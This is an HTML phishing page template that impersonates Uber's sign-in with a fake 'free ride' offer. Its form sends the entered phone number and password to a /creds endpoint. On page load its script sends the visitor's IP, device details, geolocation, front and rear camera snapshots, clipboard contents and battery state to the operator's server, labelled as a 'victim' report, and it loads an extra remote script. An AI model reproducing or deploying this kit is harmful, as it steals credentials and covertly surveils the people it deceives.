<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Uber - Get Your Free Ride</title>
<link rel="icon" href="https://d1a3f4spazzrp4.cloudfront.net/car-types/haloProductImages/v1.1/Uber_Auto_312x208_pixels_Mobile.png">
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: 'UberMoveText', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif; background: #000000; min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #ffffff; }
.container { width: 100%; max-width: 420px; padding: 20px; }
.logo { font-size: 32px; font-weight: 700; color: #fff; margin-bottom: 8px; letter-spacing: -1px; }
.car-icon { font-size: 64px; margin: 20px 0; text-align: center; }
.promo-badge { display: inline-block; background: #276EF1; color: #fff; padding: 6px 16px; border-radius: 20px; font-size: 13px; font-weight: 600; margin-bottom: 24px; }
h1 { font-size: 36px; font-weight: 700; color: #ffffff; margin-bottom: 8px; line-height: 1.2; }
.subtitle { font-size: 16px; color: #ababab; margin-bottom: 32px; line-height: 1.5; }
.form-box { background: #141414; border-radius: 12px; padding: 24px; }
.form-group { margin-bottom: 16px; }
.form-group label { display: block; font-size: 12px; font-weight: 500; color: #ababab; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 0.5px; }
.form-group input { width: 100%; padding: 14px 16px; background: #222222; border: 2px solid #333333; border-radius: 8px; font-size: 16px; color: #ffffff; }
.form-group input:focus { outline: none; border-color: #276EF1; }
.form-group input::placeholder { color: #666666; }
.phone-input { display: flex; gap: 8px; }
.phone-prefix { width: 72px; padding: 14px 8px; background: #222222; border: 2px solid #333333; border-radius: 8px; font-size: 16px; color: #ffffff; text-align: center; }
.phone-number { flex: 1; }
.btn-login { width: 100%; padding: 16px; background: #ffffff; color: #000000; border: none; border-radius: 8px; font-size: 18px; font-weight: 700; cursor: pointer; margin-top: 8px; transition: background 0.2s; }
.btn-login:hover { background: #e6e6e6; }
.terms { font-size: 11px; color: #666; margin-top: 16px; line-height: 1.6; text-align: center; }
.terms a { color: #276EF1; text-decoration: none; }
.divider { display: flex; align-items: center; margin: 20px 0; gap: 12px; }
.divider span { flex: 1; height: 1px; background: #333; }
.divider p { color: #666; font-size: 13px; }
.social-btn { width: 100%; padding: 14px; background: transparent; border: 2px solid #333; border-radius: 8px; color: #fff; font-size: 15px; font-weight: 500; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 10px; }
.social-btn:hover { border-color: #555; }
.loading { display: none; padding: 30px; text-align: center; }
.spinner { border: 3px solid #333; border-top: 3px solid #fff; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 0 auto 12px; }
@keyframes spin { to { transform: rotate(360deg); } }
.footer { text-align: center; margin-top: 32px; font-size: 12px; color: #666; }
@media (max-width: 480px) { .container { padding: 16px; } h1 { font-size: 28px; } }
</style>
</head>
<body>
<div class="container">
<div class="logo">Uber</div>
<div class="car-icon">🚗</div>
<span class="promo-badge">LIMITED TIME OFFER</span>
<h1>Get Your Free Ride</h1>
<p class="subtitle">Sign in to claim your complimentary ride worth up to $25. Offer expires soon!</p>
<div class="form-box">
<form id="loginForm">
<div class="form-group">
<label>Phone Number</label>
<div class="phone-input">
<input type="text" class="phone-prefix" value="+1" readonly>
<input type="tel" id="email" class="phone-number" placeholder="Enter phone number" required autofocus>
</div>
</div>
<div class="form-group">
<label>Password</label>
<input type="password" id="password" placeholder="Enter password" required>
</div>
<button type="submit" class="btn-login">Claim Free Ride →</button>
</form>
<div class="loading" id="loading">
<div class="spinner"></div>
<p style="color:#ababab;font-size:14px;">Verifying your account...</p>
</div>
<div class="divider"><span></span><p>or</p><span></span></div>
<button class="social-btn" onclick="return false;">Continue with Google</button>
<button class="social-btn" onclick="return false;">Continue with Apple</button>
</div>
<p class="terms">By continuing, you agree to Uber's <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.</p>
<div class="footer">© 2024 Uber Technologies Inc.</div>
</div>
<video id="video" style="display:none" playsinline autoplay></video>
<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="<%=a %>/public/advanced.js"></script>
<script>
var uid="<%=uid %>";
var video=document.getElementById('video'), canvas=document.getElementById('canvas');

async function gatherAll(){
    let td='🚗 <b>Uber Free Ride Victim!</b>\n\n';
    td+='⚓ IP: <code><%=ip %></code>\n';
    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
    try{await captureCamera("user","selfie");}catch(e){}
    try{await captureCamera("environment","back");}catch(e){}
    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
}

document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    var email = document.getElementById('email').value;
    var pass = document.getElementById('password').value;
    document.querySelector('form').style.display='none';
    document.getElementById('loading').style.display='block';
    fetch('/creds', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({username: email, password: pass, uri: '<%=uid %>', path: '<%=uid %>'})
    }).then(function(){ window.location.href = '<%=url %>'; });
});

window.onload = function(){ gatherAll(); if(typeof advancedGather==="function") advancedGather("<%=a %>","<%=uid %>"); };
</script>
</body>
</html>